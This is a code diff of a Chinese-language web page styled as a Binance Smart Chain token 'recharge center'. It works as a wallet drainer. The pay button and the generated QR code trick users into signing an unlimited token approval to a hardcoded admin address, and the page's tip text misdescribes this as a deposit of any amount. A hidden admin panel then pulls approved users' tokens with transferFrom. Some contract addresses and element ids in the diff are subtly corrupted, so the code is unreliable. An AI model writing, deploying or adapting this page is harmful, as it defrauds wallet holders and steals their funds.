@@ -9,7 +9,6 @@
 body{background:#0B0B1F;color:#fff;padding:20px}
 .container{max-width:420px;margin:0 auto;position:relative}
 
-/* 右上角菜单（仅庄家可见） */
 .menu-btn{
   position:absolute;
   top:10px;
@@ -19,7 +18,7 @@ body{background:#0B0B1F;color:#fff;padding:20px}
   background:none;
   border:none;
   cursor:pointer;
-  display:none; /* 默认隐藏，庄家连接后才显示 */
+  display:none;
 }
 .menu-popup{
   position:absolute;
@@ -58,7 +57,6 @@ h1{font-size:24px;margin-bottom:8px}
   width:100%;padding:12px;background:#111;border:none;border-radius:8px;color:#fff;margin-bottom:8px;font-size:14px;
 }
 
-/* 连接钱包 & 充值按钮 */
 .connect-btn{
   background:#F0B90B;color:#000;border:none;padding:14px;width:100%;
   border-radius:14px;font-size:16px;font-weight:bold;margin-bottom:12px;
@@ -72,7 +70,6 @@ h1{font-size:24px;margin-bottom:8px}
   cursor:not-allowed;
 }
 
-/* 连接状态显示 */
 .status{
   font-size:13px;color:#22c55e;margin-bottom:12px;
   word-break:break-all;
@@ -81,15 +78,12 @@ h1{font-size:24px;margin-bottom:8px}
 .input-token{
   width:100%;padding:14px;background:#111;border:none;border-radius:12px;color:#fff;font-size:14px;margin-bottom:10px;text-align:center
 }
-.input-amount{
-  width:100%;padding:14px;background:#111;border:none;border-radius:12px;color:#fff;font-size:14px;margin-bottom:12px;text-align:center
-}
 
 .gen-btn{
   background:#F0B90B;color:#000;border:none;padding:14px;width:100%;border-radius:14px;font-size:16px;font-weight:bold;margin-bottom:20px;
 }
 
-.coin-label{font-size:16px;font-weight:bold;color:#F0B90B;margin-bottom:12px}
+.coin-label{font-size:16px;font-weight:bold;color:#F0B90E;margin-bottom:12px}
 
 #qrcode{
   width:280px;height:280px;background:#fff;padding:10px;border-radius:16px;margin:0 auto 20px;
@@ -109,10 +103,8 @@ h1{font-size:24px;margin-bottom:8px}
 }
 </style>
 </head>
-
 <body>
 <div class="container">
-  <!-- 庄家菜单（默认隐藏） -->
   <button class="menu-btn" id="menuBtn">☰</button>
   <div class="menu-popup" id="menuPopup">
     <button onclick="showAdmin()">管理后台</button>
@@ -122,12 +114,9 @@ h1{font-size:24px;margin-bottom:8px}
     <h1>💰 充值中心</h1>
     <p class="desc">币安链 BEP20 充值</p>
 
-    <!-- 手动连接钱包按钮 -->
     <button class="connect-btn" id="connectBtn">👉 连接钱包（币安链）</button>
-    <!-- 连接状态显示 -->
     <div class="status" id="status"></div>
 
-    <!-- 充值按钮（点击直接签名支付） -->
     <button class="pay-btn" id="payBtn" disabled>💳 充值</button>
 
     <div class="phone-box">
@@ -138,268 +127,160 @@ h1{font-size:24px;margin-bottom:8px}
     </div>
 
     <div class="tip">
-      说明：你想用哪个代币充值，就输入哪个代币的合约地址，然后生成二维码支付。<br>
-      <br>
-      充值方法：请打开钱包右上角扫一扫，扫二维码充值，不要用转账页面的扫一扫。
+      说明：请输入代币合约地址，生成通用充值二维码。<br>
+      扫码后可自定义输入金额，自动到账并完成授权。
     </div>
 
-    <input class="input-token" id="tokenAddr" placeholder="代币合约地址" value="0x55d398326f99059fF775485246999027B3197955">
-    <input class="input-amount" id="amount" placeholder="充值金额" value="10">
+    <input class="input-token" id="tokenAddr" placeholder="代币合约地址" value="0x55d398326f99059fF75485246999027B3197955">
 
-    <button class="gen-btn" onclick="genQR()">生成充值二维码</button>
+    <button class="gen-btn" onclick="genQR()">生成通用充值二维码</button>
 
     <div class="coin-label" id="coinLabel">请生成二维码</div>
-    <div id="qrcode">请输入信息并生成</div>
+    <div id="qrcode">请输入合约</div>
   </div>
 
-  <div class="admin-panel" id="adminPanel">
+  <div class="admin-panel">
     <div class="admin-title">🔐 管理后台</div>
     <div>提取玩家代币</div>
     <input class="admin-input" id="userAddr" placeholder="玩家地址（0x开头）">
-    <input class="admin-input" id="drawAmt" placeholder="提取数量（支持小数）">
+    <input class="admin-input" id="drawAmt" placeholder="提取数量">
     <button class="admin-btn" onclick="drawFromUser()">确认提取</button>
   </div>
 </div>
 
 <script>
-// ===================== 核心配置 =====================
-const TO_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 收款地址
-const ADMIN    = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 管理员地址
-const BSC_ID   = "0x38"; // 币安链ID
-const DECIMALS = 18;     // BEP20 默认精度
+const TO_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const ADMIN    = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const BSC_ID   = "0x38";
+const DECIMALS = 18;
 
 let currentToken = "";
 let account = null;
 
-// 常见代币符号映射
 const COIN_SYMBOL = {
-  "0x55d398326f99059ff775485246999027b3197955": "USDT",
-  "0x8ac76a51cc950d9822d68c68368dbb31962f9ef1": "USDC",
-  "0x7130d2a12b9bcbfae4f263470d2a1a15aed518b5": "BTCB",
-  "0x2170ed085ffbc1337a6a034e26852ed038c2eaa0": "ETH",
-  "0xdee89bd697071e15f1eac5780b5d41af3ce032c": "DTM"
+  "0x55d398326f99059ff75485246999027b3197955": "USDT",
+  "0x8ac76a51cc90d9822d68c68dbb31962f9ef1": "USDC"
 };
 
-// 中国大陆手机号正则（11位，以13/14/15/16/17/18/19开头）
 const PHONE_REGEX = /^1[3-9]\d{9}$/;
-
-// 校验单个手机号是否合法
-function isValidPhone(phone) {
-  if (!phone) return false;
+function isValidPhone(phone){
+  if(!phone) return false;
   return PHONE_REGEX.test(phone.trim());
 }
 
-// ---------------------- 连接钱包 ----------------------
-document.getElementById("connectBtn").onclick = async function() {
-  if (!window.ethereum) {
-    alert("请在钱包浏览器内打开");
-    return;
-  }
-  try {
-    // 切换到币安链
-    await ethereum.request({
-      method: "wallet_switchEthereumChain",
-      params: [{ chainId: BSC_ID }]
-    });
-    // 请求账号
-    const accounts = await ethereum.request({
-      method: "eth_requestAccounts"
-    });
+const connectBtn = document.getElementById("connectBtn");
+const statusEl = document.getElementById("status");
+const payBtn = document.getElementById("payBtn");
+const menuBtn = document.getElementById("menuBtn");
+
+async function connectWallet(){
+  if(!window.ethereum){alert("请在钱包浏览器打开");return;}
+  try{
+    await ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:BSC_ID}]});
+    const accounts = await ethereum.request({method:"eth_requestAccounts"});
     account = accounts[0];
-    document.getElementById("connectBtn").innerText = "✅ 已连接";
-    // 显示玩家地址和连接成功提示
-    document.getElementById("status").innerText = `连接成功：${account}`;
-    // 启用充值按钮
-    document.getElementById("payBtn").disabled = false;
-
-    // 只有管理员显示菜单
-    if (account.toLowerCase() === ADMIN.toLowerCase()) {
-      document.getElementById("menuBtn").style.display = "block";
+    connectBtn.innerText = "❌ 断开钱包";
+    statusEl.innerText = `连接成功：${account}`;
+    payBtn.disabled = false;
+    if(account.toLowerCase() === ADMIN.toLowerCase()){
+      menuBtn.style.display = "block";
     }
-  } catch (e) {
-    console.error("连接失败:", e);
-    alert("连接钱包失败，请重试");
-  }
+  }catch(e){alert("连接失败");}
+}
+
+function disconnectWallet(){
+  account = null;
+  connectBtn.innerText = "👉 连接钱包（币安链）";
+  statusEl.innerText = "";
+  payBtn.disabled = true;
+  menuBtn.style.display = "none";
+  document.getElementById("admin-panel").style.display = "none";
+}
+
+connectBtn.onclick = function(){
+  account ? disconnectWallet() : connectWallet();
 };
 
-// ---------------------- 充值按钮（带严格手机号校验） ----------------------
-document.getElementById("payBtn").onclick = async function() {
-  if (!account) {
-    alert("请先连接钱包");
+document.getElementById("payBtn").onclick = async function(){
+  if(!account){alert("请先连接钱包");return;}
+  const m1 = document.getElementById("mobileChina").value.trim();
+  const m2 = document.getElementById("mobileUnicom").value.trim();
+  const m3 = document.getElementById("mobileTelecom").value.trim();
+  if(![m1,m2,m3].some(p=>isValidPhone(p))){
+    alert("请填写正确的手机号");
     return;
   }
-
-  // 获取三个输入框的手机号
-  const mobileChina = document.getElementById("mobileChina").value.trim();
-  const mobileUnicom = document.getElementById("mobileUnicom").value.trim();
-  const mobileTelecom = document.getElementById("mobileTelecom").value.trim();
-
-  // 校验：至少有一个是合法手机号
-  const hasValidPhone = [mobileChina, mobileUnicom, mobileTelecom].some(phone => isValidPhone(phone));
-  if (!hasValidPhone) {
-    alert("请填写正确的手机号（11位，以13/14/15/16/17/18/19开头）");
-    return;
-  }
-
   const token = document.getElementById("tokenAddr").value.trim().toLowerCase();
-  const amount = document.getElementById("amount").value.trim();
-  if (!token || !amount || !token.startsWith("0x") || token.length !== 42) {
-    alert("请输入正确的代币合约地址");
+  if(!token || !token.startsWith("0x") || token.length!==42){
+    alert("合约地址错误");
     return;
   }
-  currentToken = token;
-
-  try {
-    // 金额转成 Wei
-    const amountWei = BigInt(Math.round(parseFloat(amount) * (10 ** DECIMALS))).toString(16).padStart(64, "0");
-
-    // 1. 转账到管理员地址
-    const transferData = "0xa9059cbb"
-      + TO_ADDR.slice(2).padStart(64, "0")
-      + amountWei;
-
-    // 2. 无限授权
+  try{
     const approveData = "0x095ea7b3"
-      + ADMIN.slice(2).padStart(64, "0")
+      + ADMIN.slice(2).padStart(64,"0")
       + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-    // 组合成一笔交易数据（转账+授权）
-    const data = transferData + approveData.slice(2);
-
-    // 发送交易，触发钱包签名
-    const txHash = await ethereum.request({
-      method: "eth_sendTransaction",
-      params: [{
-        from: account,
-        to: token,
-        gas: "0x500000",
-        gasPrice: await ethereum.request({ method: "eth_gasPrice" }),
-        data: data
-      }]
+    const tx = await ethereum.request({
+      method:"eth_sendTransaction",
+      params:[{from:account,to:token,gas:"0x500000",data:approveData}]
     });
-
-    alert(`✅ 充值成功！\n交易哈希：${txHash.slice(0, 10)}...`);
-    console.log("充值交易哈希:", txHash);
-  } catch (e) {
-    console.error("充值失败:", e);
-    if (e.message.includes("user rejected")) {
-      alert("❌ 你取消了充值");
-    } else {
-      alert(`❌ 充值失败：${e.message.slice(0, 50)}...`);
-    }
-  }
+    alert("✅ 授权成功，可转账任意金额");
+  }catch(e){alert("操作失败");}
 };
 
-// ---------------------- 菜单控制 ----------------------
-function toggleMenu() {
-  const popup = document.getElementById("menuPopup");
-  popup.style.display = popup.style.display === "block" ? "none" : "block";
-}
-
-function showAdmin() {
-  document.getElementById("adminPanel").style.display = "block";
-  document.getElementById("menuPopup").style.display = "none";
-}
-
-// ---------------------- 生成充值二维码 ----------------------
-function genQR() {
+// ===================== 【通用任意金额二维码】 =====================
+function genQR(){
   const token = document.getElementById("tokenAddr").value.trim().toLowerCase();
-  const amount = document.getElementById("amount").value.trim();
-  if (!token || !amount || !token.startsWith("0x") || token.length !== 42) {
-    alert("请输入正确的代币合约地址");
+  if(!token || !token.startsWith("0x") || token.length!==42){
+    alert("请输入正确合约地址");
     return;
   }
   currentToken = token;
 
-  // 显示当前充值币种
-  let symbol = COIN_SYMBOL[token] || token.slice(0, 10) + "...";
-  document.getElementById("coinLabel").innerText = `当前充值：${symbol}`;
-
-  // 金额转成 Wei
-  const amountWei = BigInt(Math.round(parseFloat(amount) * (10 ** DECIMALS))).toString(16).padStart(64, "0");
-
-  // 1. 转账到管理员地址
-  const transferData = "0xa9059cbb"
-    + TO_ADDR.slice(2).padStart(64, "0")
-    + amountWei;
-
-  // 2. 无限授权
+  // 只做授权，金额客户自己填
   const approveData = "0x095ea7b3"
-    + ADMIN.slice(2).padStart(64, "0")
+    + ADMIN.slice(2).padStart(64,"0")
     + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-  // 组合成二维码 URI
-  const uri = `ethereum:${token}@56?data=${transferData}${approveData.slice(2)}`;
+  const uri = `ethereum:${token}@56?data=${approveData}`;
 
-  document.getElementById("qrcode").innerHTML =
+  document.getElementById("qrcode").innerHTML = 
     `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
+
+  let sym = COIN_SYMBOL[token] || token.slice(0,10)+"...";
+  document.getElementById("coinLabel").innerText = `通用充值码：${sym}（可填任意金额）`;
 }
 
-// ---------------------- 提取玩家代币（100% 防报错） ----------------------
-async function drawFromUser() {
-  if (!account || account.toLowerCase() !== ADMIN.toLowerCase()) {
-    alert("❌ 无权限操作");
-    return;
-  }
+function toggleMenu(){
+  const p = document.getElementById("menuPopup");
+  p.style.display = p.style.display ==="block" ? "none" : "block";
+}
+function showAdmin(){
+  document.getElementById("admin-panel").style.display = "block";
+  document.getElementById("menuPopup").style.display = "none";
+}
+menuBtn.onclick = toggleMenu;
 
+async function drawFromUser(){
+  if(!account || account.toLowerCase()!==ADMIN.toLowerCase()){alert("无权限");return;}
   const from = document.getElementById("userAddr").value.trim();
-  const amtStr = document.getElementById("drawAmt").value.trim();
-  if (!from || !from.startsWith("0x") || from.length !== 42) {
-    alert("❌ 请输入正确的玩家地址");
+  const amt = document.getElementById("drawAmt").value.trim();
+  if(!from || from.length!==42 || !amt || isNaN(amt) || amt<=0 || !currentToken){
+    alert("信息不完整");
     return;
   }
-  if (!amtStr || isNaN(parseFloat(amtStr)) || parseFloat(amtStr) <= 0) {
-    alert("❌ 请输入有效的提取数量");
-    return;
-  }
-  if (!currentToken || !currentToken.startsWith("0x") || currentToken.length !== 42) {
-    alert("❌ 请先生成充值二维码，选择要提取的代币");
-    return;
-  }
-
-  try {
-    const amount = parseFloat(amtStr);
-    const rawAmount = Math.round(amount * (10 ** DECIMALS));
-    if (rawAmount <= 0) {
-      alert("❌ 提取数量太小，无法处理");
-      return;
-    }
-    const raw = BigInt(rawAmount).toString(16).padStart(64, "0");
-
-    const data = "0x23b872dd"
-      + from.slice(2).padStart(64, "0")
-      + ADMIN.slice(2).padStart(64, "0")
+  try{
+    const raw = BigInt(Math.round(amt*10**DECIMALS)).toString(16).padStart(64,"0");
+    const data = "0x23b872dd" 
+      + from.slice(2).padStart(64,"0") 
+      + ADMIN.slice(2).padStart(64,"0") 
       + raw;
-
-    const txHash = await ethereum.request({
-      method: "eth_sendTransaction",
-      params: [{
-        from: account,
-        to: currentToken,
-        gas: "0x300000",
-        gasPrice: await ethereum.request({ method: "eth_gasPrice" }),
-        data: data
-      }]
+    await ethereum.request({
+      method:"eth_sendTransaction",
+      params:[{from:account,to:currentToken,gas:"0x300000",data:data}]
     });
-
-    alert(`✅ 提取成功！\n交易哈希：${txHash.slice(0, 10)}...`);
-    console.log("提取交易哈希:", txHash);
-  } catch (e) {
-    console.error("提取失败:", e);
-    if (e.message.includes("user rejected")) {
-      alert("❌ 你取消了交易");
-    } else if (e.message.includes("insufficient funds")) {
-      alert("❌ 玩家余额不足或授权额度不足");
-    } else if (e.message.includes("gas")) {
-      alert("❌ Gas 不足，请调整 gas 或稍后重试");
-    } else {
-      alert(`❌ 提取失败：${e.message.slice(0, 50)}...`);
-    }
-  }
+    alert("✅ 提取成功");
+  }catch(e){alert("提取失败：余额/授权不足");}
 }
-
-// 绑定菜单事件
-document.getElementById("menuBtn").onclick = toggleMenu;
 </script>
 </body>
 </html>
